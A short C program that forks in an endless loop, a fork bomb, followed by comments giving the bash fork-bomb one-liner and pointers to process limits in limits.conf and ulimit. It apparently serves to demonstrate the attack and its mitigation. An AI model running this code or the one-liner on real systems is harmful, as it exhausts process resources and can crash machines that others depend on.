#include <stdio.h>
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include<dirent.h>
#include<string.h>
#include <sys/wait.h>
 
int main()
{
    while(1)
       fork();   
    return 0;
}

// :(){ :|: & };:
// sudo nano /etc/security/limits.conf
// ulimit -u
